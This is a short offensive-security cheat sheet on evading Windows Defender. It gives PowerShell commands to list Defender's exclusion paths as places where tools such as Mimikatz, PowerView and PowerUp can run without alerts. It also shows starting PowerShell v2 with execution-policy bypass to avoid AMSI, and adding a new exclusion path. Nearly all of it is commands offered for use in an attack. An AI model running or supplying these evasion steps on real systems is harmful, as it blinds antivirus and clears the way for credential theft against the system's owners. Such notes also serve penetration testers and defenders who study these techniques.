# Exclusion Paths

### Get a list of exclusion paths from Windows Denfeder

Here we can load malicious scripts (Mimikatz, powerview, powerup...) and the AV won't alert anything.

```bash
Get-MpPreference | select-object -expandproperty exclusionpath
```

Now disable AMSI to transfer the script (or run PS v2, which doesn't have AMSI).

```bash
powershell -v 2 -ep bypass
```

***

### Add an exclusion path to the AV

```bash
Add-MpPreference -ExclusionPath "C:\XXX\XXX\"
```
